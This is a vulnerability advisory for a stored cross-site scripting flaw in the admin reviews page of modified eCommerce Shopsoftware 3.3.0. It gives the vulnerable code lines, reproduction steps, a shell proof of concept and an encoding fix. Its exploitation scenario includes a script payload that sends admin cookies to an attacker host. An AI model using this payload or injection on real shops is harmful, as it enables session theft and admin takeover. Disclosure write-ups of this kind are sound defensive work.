# Stored Cross-Site Scripting in Admin Reviews Listing of modified eCommerce Shopsoftware

## Vulnerability Information

| Field | Details |
|---|---|
| Advisory ID | VULN-2026-004 |
| CVE ID | Pending assignment |
| Vendor | modified-shop |
| Product | modified eCommerce Shopsoftware |
| Tested Version | 3.3.0 (rev. 16825) |
| Vulnerability Type | Stored Cross-Site Scripting |
| CWE | CWE-79 |
| Severity | Medium (Provisional) |
| CVSS v3.1 | 4.8 |
| Discovery Date | 2026-11-18 |
| Publication Date | Pending |
| Patch Status | No fix documented |
| Disclosure Status | Pending |

---

## 1. Executive Summary

A stored cross-site scripting (Stored XSS) vulnerability was identified in modified eCommerce Shopsoftware v3.3.0 due to improper output encoding of the `products_name` field within the administrative reviews management page.

The vulnerability originates in `admin/reviews.php` (lines 155, 188, 197, and 213), where product names are rendered within the reviews listing table, detail panel, and information box heading without appropriate HTML encoding through `htmlspecialchars()`.

The following code excerpts illustrate the improper handling of the affected field:

```php
// admin/reviews.php:155 — products_name in table listing without htmlspecialchars():
<td class="dataTableContent"><?php echo $reviews['products_name']; ?></td>

// admin/reviews.php:188,197 — products_name in detail panel without htmlspecialchars():
$contents[] = array('text' => '<br /><b>' . $rInfo->products_name . '</b>');

// admin/reviews.php:213 — products_name in heading without htmlspecialchars():
$heading[] = array('text' => '<b>' . $rInfo->products_name . '</b>');
```

The `products_name` field is processed through `xtc_db_prepare_input()` and stored in the `products_description` database table. When the administrative reviews management page is accessed, the stored value is retrieved and rendered in multiple locations without context-appropriate output encoding.

As a result, an authenticated user with permission to modify product records could inject arbitrary JavaScript that is subsequently executed in the browser of other administrators accessing the affected reviews management interface.

Successful exploitation requires an authenticated user with product editing permissions, an existing review associated with the affected product, and interaction from an administrator accessing the reviews management page.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/reviews.php:155 | rev 16825 | None | Affected |
| Component: admin/reviews.php:188,197,213 | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker), Smarty 3

---

## 3. Vulnerability Description

### Storage (`admin/products.php`)

```php
// admin/products.php — products_name stored without HTML encoding:
// products_description.products_name = xtc_db_prepare_input($_POST['products_name'][...])
// xtc_db_prepare_input = trim() + stripslashes() only — no htmlspecialchars()
```

### Rendering (`admin/reviews.php:155,188,197,213`)

```php
// admin/reviews.php:155 — products_name in listing table, no htmlspecialchars():
<td class="dataTableContent"><?php echo $reviews['products_name']; ?></td>

// admin/reviews.php:188 — products_name in detail panel (view/edit mode):
$contents[] = array('text' => '<br /><b>' . $rInfo->products_name . '</b>');

// admin/reviews.php:197 — products_name in detail panel (edit mode):
$contents[] = array('text' => '<br />' . ENTRY_PRODUCT . '<br /><b>' . $rInfo->products_name . '</b>');

// admin/reviews.php:213 — products_name as heading in info box:
$heading[] = array('text' => '<b>' . $rInfo->products_name . '</b>');
```

### Necessary Conditions

- **Authentication:** Admin (to inject `products_name` and to trigger the XSS)
- **User interaction:** Required — admin must visit Admin → Catalog → Reviews
- **Attack vector:** Network

---

## 4. Impact

**Admin panel (CVSS 4.8):**
- Confidentiality: Low — admin session tokens (if non-HttpOnly), CSRF tokens
- Integrity: Low — admin panel manipulation
- Scope: Changed — admin browser affected

---

## 5. Classification

### CVSS (admin injection, admin trigger)

- **Score:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE / CAPEC

- CWE-79 / CAPEC-198: Stored XSS

---

## 6. Exploitation Scenario

1. Admin edits a product and sets the **Name** field to `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`.
2. A customer leaves a review for that product.
3. Any admin who visits Admin → Catalog → Reviews triggers the script from `line 155` (listing table).
4. When the admin clicks to view/edit the specific review, the script also fires from `lines 188,197,213`.

---

## 7. Technical Evidence

### Affected Components

```text
Admin:   admin/products.php — products_name stored via xtc_db_prepare_input (no htmlspecialchars)
         admin/reviews.php:155 — echo $reviews['products_name'] (no htmlspecialchars)
         admin/reviews.php:188,197 — $rInfo->products_name (no htmlspecialchars)
         admin/reviews.php:213 — $rInfo->products_name as heading (no htmlspecialchars)
Database table: products_description (column: products_name)
Parameter(s): products_name[<lang_id>] (POST — admin/products.php)
Authentication: Admin to inject and to trigger
```

### Example Inject

```bash
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE products_description
      SET products_name='Hacked <script>alert(document.cookie)</script>'
      WHERE products_id=1 AND language_id=2;" 2>/dev/null
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE products_description
      SET products_name='Hacked <script>alert(\"V68_admin_reviews\")</script>'
      WHERE products_id=1 AND language_id=2;" 2>/dev/null

echo "[*] Admin visits admin/reviews.php to trigger XSS in product name column."
```

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Products → Products → edit a product. Set **Name** to `<script>alert(1)</script>`. Save.
3. Leave a review for that product as a customer (or add a review directly in the DB).
4. Navigate to Admin → Catalog → Reviews.
5. `alert(1)` fires from `admin/reviews.php:155` (the product name column in the reviews table).

---

## 10. Fix

```php
// admin/reviews.php:155 — fix:
<td class="dataTableContent"><?php echo htmlspecialchars($reviews['products_name'], ENT_QUOTES, 'UTF-8'); ?></td>

// admin/reviews.php:188,197,213 — fix:
$contents[] = array('text' => '<br /><b>' . htmlspecialchars($rInfo->products_name, ENT_QUOTES, 'UTF-8') . '</b>');
```

---

## 11. Disclosure Timeline

| Date | Event |
|---|---|
| 18/11/2026 | Identified via code review |
| 18/11/2026 | Advisory prepared |
| pending | Vendor notified |

---

## 12. Credits

- **Researcher:** Van Alyson Dutra (@4rch30n), Marcus de Almeida (@maarckz) & Daniel Costa (@bscosta91)
- **Contact:** van.vep@gmail.com

---

## 13. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html

---

## 14. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 15. Contact

- **Email:** van.vep@gmail.com
- **Repository:** https://github.com/4RCH30N/Vuln-Research/
